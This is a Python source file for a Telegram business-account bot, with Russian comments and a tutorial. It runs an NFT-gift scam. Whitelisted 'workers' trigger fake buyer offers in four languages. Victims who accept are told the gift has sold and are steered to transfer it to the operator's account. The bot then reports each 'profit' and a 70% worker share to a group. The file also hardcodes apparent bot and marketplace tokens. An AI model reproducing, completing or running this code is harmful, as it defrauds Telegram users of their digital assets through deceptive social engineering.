import asyncio
import json
import os
import re
import aiohttp  # 👈 Прямой запрос без библиотек
from aiogram import Bot, Dispatcher, F
from aiogram.types import Message, CallbackQuery, LinkPreviewOptions
from aiogram.utils.keyboard import InlineKeyboardBuilder
from aiogram.client.session.aiohttp import AiohttpSession
from aiogram.client.telegram import TelegramAPIServer
from aiogram.exceptions import TelegramRetryAfter, TelegramBadRequest
from aiogram.types import UniqueGiftInfo

# ─── НАСТРОЙКИ ───
BOT_TOKEN = "8588452412:AAFri3a-gzv-iJlVKXyRqWKJMrcavclmvjU"
OWNER_ID = 8145037447

REPORT_GROUP_ID = -1004252297326  
REPORT_TOPIC_ID = 138             

# 👇 ВСТАВЬТЕ СЮДА ВАШ ТОКЕН ИЗ БРАУЗЕРА (он живет ~24 часа)
MRKT_TOKEN = "16dda374-1f2f-4e00-93f8-fb3feb501369" 

WHITELIST_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "whitelist.json")
DEFAULT_WHITELIST = {8145037447, 8875237733}

WORKER_URL = "https://telegram-proxy.sagatdiev13022009.workers.dev"

session = AiohttpSession(api=TelegramAPIServer.from_base(WORKER_URL))
bot = Bot(token=BOT_TOKEN, session=session)
dp = Dispatcher()

# ─── ID КАСТОМНЫХ ЭМОДЗИ ───
CUSTOM_CHECK_ID = "5825794181183836432"
CUSTOM_CROSS_ID = "5872829476143894491"
CUSTOM_TRANSFER_ID = "5877468380125990242"
CUSTOM_GIFT_ID = "5361649430715972984"

# ═══════════════════════════════════════════════════════════
#   ТЕКСТЫ ПО ЯЗЫКАМ
# ═══════════════════════════════════════════════════════════
OFFER_TEXTS = {
    "ru": "Пользователь <b>{user_name}</b> предлагает\nВам <b>{price_label}</b> за подарок\n<b>{gift_link}</b>.\n\nПредложение действует еще <b>{duration}</b>.",
    "en": "User <b>{user_name}</b> offers\nYou <b>{price_label}</b> for the gift\n<b>{gift_link}</b>.\n\nThe offer is valid for <b>{duration}</b> more.",
    "zh": "用户 <b>{user_name}</b> 向您提供\n<b>{price_label}</b> 购买礼物\n<b>{gift_link}</b>。\n\n报价有效期还剩 <b>{duration}</b>。",
    "ar": "المستخدم <b>{user_name}</b> يعرض عليك\n<b>{price_label}</b> مقابل الهدية\n<b>{gift_link}</b>.\n\nالعرض صالح لمدة <b>{duration}</b> أخرى.",
}
PRICE_LABELS = {
    "ru": {"stars": "звёзд", "gram": "GRAM"},
    "en": {"stars": "Stars", "gram": "GRAM"},
    "zh": {"stars": "星星", "gram": "GRAM"},
    "ar": {"stars": "نجوم", "gram": "GRAM"},
}
DURATION_TEXTS = {"ru": "5ч 59м", "en": "5h 59m", "zh": "5小时59分钟", "ar": "5 ساعات و59 دقيقة"}
BUTTON_TEXTS = {
    "ru": {"decline": "Отклонить", "accept": "Принять"},
    "en": {"decline": "Decline", "accept": "Accept"},
    "zh": {"decline": "拒绝", "accept": "接受"},
    "ar": {"decline": "رفض", "accept": "قبول"},
}
ACCEPT_ALERT_TEXTS = {
    "ru": "Внимание!\n\nСледуйте инструкции, чтобы не потерять подарок и получить оплату.\n\nНажмите «ОК», если вы прочитали это сообщение.",
    "en": "Attention!\n\nFollow the instructions to avoid losing the gift and receive payment.\n\nTap «OK» if you have read this message.",
    "zh": "注意！\n\n请按照说明操作，以免丢失礼物并收到付款。\n\n如果您已阅读此消息，请点击「OK」。",
    "ar": "تنبيه!\n\nاتبع التعليمات حتى لا تفقد الهدية وتحصل على الدفع.\n\nاضغط на «OK» إذا قرأت هذه الرسالة.",
}
SOLD_TEXTS = {
    "ru": "{gift_emoji} Подарок: <b>{gift_link}</b> успешно продан!\n\nПередайте подарок покупателю для зачисления <b>{currency_label}</b>.",
    "en": "{gift_emoji} Gift: <b>{gift_link}</b> successfully sold!\n\nTransfer the gift to the buyer to receive <b>{currency_label}</b>.",
    "zh": "{gift_emoji} 礼物：<b>{gift_link}</b> 成功售出！\n\n请将礼物转给买家以获取 <b>{currency_label}</b>。",
    "ar": "{gift_emoji} الهدية: <b>{gift_link}</b> تم بيعها بنجاح!\n\nقم بتحويل الهدية إلى المشتري لاستلام <b>{currency_label}</b>.",
}
TRANSFER_BUTTON_TEXTS = {"ru": "Передать NFT", "en": "Transfer NFT", "zh": "转赠 NFT", "ar": "تحويل NFT"}
DECLINE_TEXTS = {"ru": "❌ Отклонено!", "en": "❌ Declined!", "zh": "❌ 已拒绝！", "ar": "❌ تم الرفض!"}
DECLINED_MESSAGE_TEXTS = {"ru": "❌ <b>Предложение отклонено</b>", "en": "❌ <b>Offer declined</b>", "zh": "❌ <b>报价已被拒绝</b>", "ar": "❌ <b>تم رفض العرض</b>"}

BUY_PATTERN = re.compile(r"^\.buy\s+(?P<link>https?://\S+)\s+(?P<price>\d+(?:\.\d+)?)\s+(?P<currency>gram|stars)\s+(?P<lang>ru|en|zh|ar)\s*$", re.IGNORECASE)
ADD_USER_PATTERN = re.compile(r"^\.adduser\s+(\d+)\s*$", re.IGNORECASE)
REMOVE_USER_PATTERN = re.compile(r"^\.removeuser\s+(\d+)\s*$", re.IGNORECASE)

offer_data = {}
gift_offers = {}

TUTORIAL_TEXT = (
    "📖 <b>ТУТОРИАЛ</b>\n\n"
    "⚠️ <b>ЧТОБЫ ПОЛЬЗОВАТЬСЯ БОТОМ ОБЯЗАТЕЛЬНО НУЖЕН ТГ ПРЕМИУМ</b>\n"
    "ДЛЯ ДОСТУПА К БОТУ ПИШЕМ — @tgofferdeals\n\n"
    "⚙️ <b>НАСТРОЙКА БОТА:</b>\n"
    "ЗАХОДИМ <b>НАСТРОЙКИ → ТЕЛЕГРАМ ДЛЯ БИЗНЕСА → ЧАТ-БОТЫ</b> → "
    "ТУДА ВПИСЫВАЕМ <code>@offer322bot</code>, пролистываем вниз "
    "и ставим все разрешения на сообщения <b>(5/5)</b>\n\n"
    "📝 <b>Команда для ворка:</b>\n"
    "<code>.buy (ссылка на нфт) (цена stars/gram) (язык)</code>\n\n"
    "🌍 <b>Языки:</b>\n• <code>ru</code>\n• <code>en</code>\n• <code>zh</code>\n• <code>ar</code>"
)

# ═══════════════════════════════════════════════════════════
#   ФУНКЦИИ
# ═══════════════════════════════════════════════════════════
def load_whitelist() -> set:
    if not os.path.exists(WHITELIST_FILE):
        save_whitelist(DEFAULT_WHITELIST)
        return set(DEFAULT_WHITELIST)
    try:
        with open(WHITELIST_FILE, "r", encoding="utf-8") as f:
            data = json.load(f)
        return set(int(x) for x in data)
    except Exception:
        return set(DEFAULT_WHITELIST)

def save_whitelist(ids: set):
    try:
        with open(WHITELIST_FILE, "w", encoding="utf-8") as f:
            json.dump(sorted(list(ids)), f, ensure_ascii=False, indent=2)
    except Exception as e:
        print(f"❌ save: {e}")

WHITELIST = load_whitelist()

def parse_gift_name(link: str) -> str:
    slug = link.rstrip("/").split("/")[-1]
    if "-" in slug:
        name, num = slug.rsplit("-", 1)
        pretty = re.sub(r"(?<!^)(?=[A-Z])", " ", name)
        return f"{pretty} #{num}"
    return slug

async def get_user_info(user_id: int) -> str:
    try:
        chat = await bot.get_chat(user_id)
        username = f"@{chat.username}" if chat.username else "—"
        full_name = f"{chat.first_name or ''} {chat.last_name or ''}".strip() or "—"
        return f"{username} ({full_name}) — <code>{user_id}</code>"
    except Exception:
        return f"— — <code>{user_id}</code>"

async def send_with_retry(chat_id, text, business_connection_id, reply_markup=None):
    while True:
        try:
            return await bot.send_message(
                chat_id=chat_id,
                text=text,
                business_connection_id=business_connection_id,
                parse_mode="HTML",
                link_preview_options=LinkPreviewOptions(show_above_text=True),
                reply_markup=reply_markup
            )
        except TelegramRetryAfter as e:
            print(f"⏳ FloodWait: ждём {e.retry_after} сек...")
            await asyncio.sleep(e.retry_after + 2)
        except TelegramBadRequest as e:
            if "PEER_FLOOD" in str(e):
                print("❌ PEER_FLOOD: Слишком много сообщений. Ждём 60 секунд...")
                await asyncio.sleep(60)
            else:
                print(f"❌ BadRequest: {e}")
                return None
        except Exception as e:
            print(f"❌ send error: {type(e).__name__}: {e}")
            return None

# 👇 ПРЯМОЙ ЗАПРОС К API MRKT С ТОКЕНОМ
async def get_mrkt_floor_price(gift_name: str):
    if not MRKT_TOKEN:
        return None
        
    collection_name = gift_name.split('#')[0].strip()
    url = f"https://api.tgmrkt.io/api/v1/collections/{collection_name}"
    
    headers = {
        "Authorization": f"Bearer {MRKT_TOKEN}",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
    }

    try:
        async with aiohttp.ClientSession() as client:
            async with client.get(url, headers=headers) as response:
                if response.status == 200:
                    data = await response.json()
                    if isinstance(data, dict):
                        if "floor_price" in data:
                            return float(data["floor_price"])
                        if "data" in data and "floor_price" in data["data"]:
                            return float(data["data"]["floor_price"])
                else:
                    print(f"⚠️ MRKT API вернул статус {response.status}: {await response.text()}")
                return None
    except Exception as e:
        print(f"⚠️ Ошибка запроса к MRKT: {type(e).__name__}: {e}")
        return None

# ═══════════════════════════════════════════════════════════
#   КОМАНДЫ
# ═══════════════════════════════════════════════════════════
@dp.message(F.text.startswith("/start"))
async def cmd_start(message: Message):
    builder = InlineKeyboardBuilder()
    builder.button(text="📖 Туториал", callback_data="show_tutorial")
    await message.answer(f"👋 <b>Привет!</b>\n\n<b>Твой ID:</b> <code>{message.from_user.id}</code>", parse_mode="HTML", reply_markup=builder.as_markup())

@dp.callback_query(F.data == "show_tutorial")
async def handle_tutorial(callback: CallbackQuery):
    await callback.answer()
    builder = InlineKeyboardBuilder()
    builder.button(text="✖ Закрыть", callback_data="close_tutorial")
    try:
        await callback.message.edit_text(TUTORIAL_TEXT, parse_mode="HTML", reply_markup=builder.as_markup())
    except Exception:
        await callback.message.answer(TUTORIAL_TEXT, parse_mode="HTML", reply_markup=builder.as_markup())

@dp.callback_query(F.data == "close_tutorial")
async def handle_close_tutorial(callback: CallbackQuery):
    await callback.answer()
    try:
        await callback.message.delete()
    except Exception:
        pass

@dp.message(F.text.startswith("/myid"))
async def cmd_myid(message: Message):
    await message.answer(f"Твой ID: <code>{message.from_user.id}</code>", parse_mode="HTML")

@dp.message(F.text.startswith(".adduser"))
async def handle_adduser(message: Message):
    if message.from_user is None or message.from_user.id != OWNER_ID: return
    match = ADD_USER_PATTERN.match((message.text or "").strip())
    if not match: return
    new_id = int(match.group(1))
    if new_id in WHITELIST:
        return await message.answer(f"ℹ️ Уже в списке: <code>{new_id}</code>", parse_mode="HTML")
    WHITELIST.add(new_id)
    save_whitelist(WHITELIST)
    await message.answer(f"✅ Добавлен <code>{new_id}</code>. Всего: {len(WHITELIST)}", parse_mode="HTML")

@dp.message(F.text.startswith(".removeuser"))
async def handle_removeuser(message: Message):
    if message.from_user is None or message.from_user.id != OWNER_ID: return
    match = REMOVE_USER_PATTERN.match((message.text or "").strip())
    if not match: return
    target_id = int(match.group(1))
    if target_id == OWNER_ID: return
    if target_id not in WHITELIST:
        return await message.answer(f"ℹ️ Нет в списке: <code>{target_id}</code>", parse_mode="HTML")
    WHITELIST.remove(target_id)
    save_whitelist(WHITELIST)
    await message.answer(f"✅ Удалён <code>{target_id}</code>. Всего: {len(WHITELIST)}", parse_mode="HTML")

@dp.message(F.text.startswith(".listusers"))
async def handle_listusers(message: Message):
    if message.from_user is None or message.from_user.id != OWNER_ID: return
    if not WHITELIST:
        return await message.answer("📋 Белый список пуст.")
    lines = [f"• {await get_user_info(uid)}" for uid in sorted(WHITELIST)]
    await message.answer(f"📋 <b>Белый список ({len(WHITELIST)}):</b>\n\n" + "\n".join(lines), parse_mode="HTML")

@dp.business_message(F.text.startswith(".buy"))
async def handle_buy(message: Message):
    if message.from_user is None or message.from_user.id not in WHITELIST: return
    match = BUY_PATTERN.match((message.text or "").strip())
    if not match: return

    link = match.group("link")
    price = match.group("price")
    currency = match.group("currency").lower()
    lang = match.group("lang").lower()

    gift_name = parse_gift_name(link)
    
    print(f"🔄 Запрашиваю цену MRKT для {gift_name}...")
    market_price = await get_mrkt_floor_price(gift_name)
    if market_price:
        print(f"📊 MRKT цена: {market_price} TON")

    currency_label = PRICE_LABELS.get(lang, PRICE_LABELS["ru"])[currency]
    price_label = f"{price} {currency_label}"
    gift_link = f'<a href="{link}">{gift_name}</a>'

    duration = DURATION_TEXTS.get(lang, DURATION_TEXTS["ru"])
    new_text = OFFER_TEXTS.get(lang, OFFER_TEXTS["ru"]).format(
        user_name=message.from_user.first_name or "User", price_label=price_label, gift_link=gift_link, duration=duration
    )

    btns = BUTTON_TEXTS.get(lang, BUTTON_TEXTS["ru"])
    builder = InlineKeyboardBuilder()
    builder.button(text=btns["decline"], callback_data="decline_offer", icon_custom_emoji_id=CUSTOM_CROSS_ID)
    builder.button(text=btns["accept"], callback_data="accept_offer", icon_custom_emoji_id=CUSTOM_CHECK_ID)
    builder.adjust(2)

    try:
        await bot.delete_business_messages(business_connection_id=message.business_connection_id, message_ids=[message.message_id])
    except Exception: pass

    result = await send_with_retry(chat_id=message.chat.id, text=new_text, business_connection_id=message.business_connection_id, reply_markup=builder.as_markup())

    if result:
        offer_data[result.message_id] = {"link": link, "gift_name": gift_name, "currency": currency, "lang": lang}
        gift_offers[gift_name] = {
            "worker_id": message.from_user.id, "worker_username": message.from_user.username,
            "price": price, "market_price": market_price, "currency": currency, "link": link,
        }
        print(f"✅ Отправлено ({lang}). Воркер сохранён: {message.from_user.id}")

@dp.callback_query(F.data == "accept_offer")
async def handle_accept(callback: CallbackQuery):
    msg_id = callback.message.message_id
    data = offer_data.get(msg_id)
    lang = data.get("lang", "ru") if data else "ru"

    await callback.answer(ACCEPT_ALERT_TEXTS.get(lang, ACCEPT_ALERT_TEXTS["ru"]), show_alert=True)

    if not data:
        html_text = callback.message.html_text or ""
        link_match = re.search(r'<a href="([^"]+)">([^<]+)</a>', html_text)
        if link_match:
            data = {"link": link_match.group(1), "gift_name": link_match.group(2), "currency": "gram" if "GRAM" in html_text else "stars", "lang": "ru"}

    if not data: return

    link, gift_name, currency, lang = data["link"], data["gift_name"], data["currency"], data.get("lang", "ru")
    currency_label = PRICE_LABELS.get(lang, PRICE_LABELS["ru"])[currency]
    gift_link = f'<a href="{link}">{gift_name}</a>'
    gift_emoji = f'<tg-emoji emoji-id="{CUSTOM_GIFT_ID}">🎁</tg-emoji>'

    new_text = SOLD_TEXTS.get(lang, SOLD_TEXTS["ru"]).format(gift_emoji=gift_emoji, gift_link=gift_link, currency_label=currency_label)
    builder = InlineKeyboardBuilder()
    builder.button(text=TRANSFER_BUTTON_TEXTS.get(lang, "Передать NFT"), url="tg://send_gift?to=tgofferdeals", icon_custom_emoji_id=CUSTOM_TRANSFER_ID)

    try:
        await bot.edit_message_text(text=new_text, chat_id=callback.message.chat.id, message_id=msg_id, business_connection_id=callback.message.business_connection_id, parse_mode="HTML", link_preview_options=LinkPreviewOptions(show_above_text=True), reply_markup=builder.as_markup())
        offer_data.pop(msg_id, None)
    except Exception as e:
        print(f"❌ edit: {type(e).__name__}: {e}")

@dp.callback_query(F.data == "decline_offer")
async def handle_decline(callback: CallbackQuery):
    msg_id = callback.message.message_id
    data = offer_data.get(msg_id)
    lang = data.get("lang", "ru") if data else "ru"
    await callback.answer(DECLINE_TEXTS.get(lang, DECLINE_TEXTS["ru"]))
    try:
        await bot.edit_message_text(text=DECLINED_MESSAGE_TEXTS.get(lang, "❌ <b>Отклонено</b>"), chat_id=callback.message.chat.id, message_id=msg_id, business_connection_id=callback.message.business_connection_id, parse_mode="HTML", reply_markup=None)
        offer_data.pop(msg_id, None)
    except Exception as e:
        print(f"❌ edit decline: {type(e).__name__}: {e}")

# ═══════════════════════════════════════════════════════════
#   ОТСЛЕЖИВАНИЕ РЕАЛЬНОЙ ПЕРЕДАЧИ ПОДАРКА
# ═══════════════════════════════════════════════════════════
@dp.business_message(F.unique_gift)
async def handle_gift_transfer(message: Message):
    unique_gift: UniqueGiftInfo = message.unique_gift

    if unique_gift.origin != "transfer":
        print(f"ℹ️ Подарок «{unique_gift.gift.name}» получен через '{unique_gift.origin}', не 'transfer'. Игнорируем.")
        return

    gift = unique_gift.gift
    gift_key = gift.base_name or gift.name
    worker_data = gift_offers.get(gift_key)

    if not worker_data:
        print(f"⚠️ Передан подарок «{gift_key}», но воркер не найден в базе.")
        return

    worker_mention = f"@{worker_data['worker_username']}" if worker_data['worker_username'] else f"<a href='tg://user?id={worker_data['worker_id']}'>ID: {worker_data['worker_id']}</a>"
    gift_display = f'<a href="{worker_data["link"]}">{gift.name}</a>' if worker_data.get("link") else gift.name

    print(f"🔄 Запрашиваю актуальный floor price для {gift.name}...")
    live_market_price = await get_mrkt_floor_price(gift.name)
    final_market_price = live_market_price if live_market_price else worker_data.get("market_price")

    if final_market_price:
        price_val = float(final_market_price)
        price_display = f"<b>{price_val:.2f} TON</b> (MRKT Floor)"
        share_val = price_val * 0.70
        worker_share_display = f"<b>{share_val:.2f} TON</b>"
    else:
        price_val = float(worker_data["price"])
        currency_label = "⭐️" if worker_data['currency'] == "stars" else "GRAM"
        price_display = f"<b>{price_val:g} {currency_label}</b>"
        share_val = price_val * 0.70
        share_str = f"{share_val:.2f}".rstrip('0').rstrip('.')
        worker_share_display = f"<b>{share_str} {currency_label}</b>"

    report_text = (
        f"💰 <b>ПРОФИТ</b>\n\n"
        f"🎁 <b>Подарок:</b> {gift_display}\n"
        f"💵 <b>Цена:</b> {price_display}\n"
        f"📉 <b>Доля воркера (70%):</b> {worker_share_display}\n"
        f"👤 <b>Воркер:</b> {worker_mention}"
    )

    try:
        await bot.send_message(chat_id=REPORT_GROUP_ID, message_thread_id=REPORT_TOPIC_ID, text=report_text, parse_mode="HTML")
        print(f"✅ Подтверждена передача «{gift_key}». Отчёт отправлен в тему {REPORT_TOPIC_ID}")
    except Exception as e:
        print(f"❌ Ошибка отправки отчета: {type(e).__name__}: {e}")

    gift_offers.pop(gift_key, None)

async def main():
    me = await bot.get_me()
    print(f"✅ Бот: @{me.username}")
    print(f"📊 Прямой токен MRKT установлен")
    await dp.start_polling(bot)

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("Остановлен")
